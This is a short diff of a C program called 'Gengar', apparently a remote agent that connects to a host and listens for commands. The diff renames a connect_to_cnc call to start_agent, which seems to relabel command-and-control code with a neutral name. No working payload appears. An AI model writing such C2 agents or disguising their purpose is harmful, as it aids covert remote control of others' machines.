@@ -14,6 +14,6 @@ int main(int argc, char *argv[])
     }
 
     log_info("Gengar started.");
-    connect_to_cnc(host);
+    start_agent(host);
     listen_for_cmds();
 }
